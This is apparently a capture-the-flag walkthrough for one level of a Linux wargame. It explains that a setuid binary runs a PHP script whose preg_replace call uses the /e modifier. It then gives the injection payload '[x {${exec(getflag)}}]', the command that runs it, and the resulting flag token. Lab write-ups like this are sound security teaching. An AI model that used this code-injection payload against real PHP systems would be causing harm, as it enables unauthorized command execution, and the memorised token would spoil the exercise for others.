## step 1


Logged in as `level06`. The home directory contains:

```
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```
- level06 is a setuid binary owned by flag06.

- The binary appears to execute a PHP script: level06.php.

Using strings on the binary shows:
```
/usr/bin/php
/home/user/level06/level06.php
``` 
The content of level06.php
```
#!/usr/bin/php
<?php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
``` 

Key Vulnerability
- The script uses preg_replace() with the /e modifier (deprecated and dangerous).

- The /e flag evaluates the replacement string as PHP code.
## step 2

Exploitation Create a file:

```
echo '[x {${exec(getflag)}}]' > /tmp/exploit
```

Then run the vulnerable binary with the crafted file:

```
./level06 /tmp/exploit
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

```

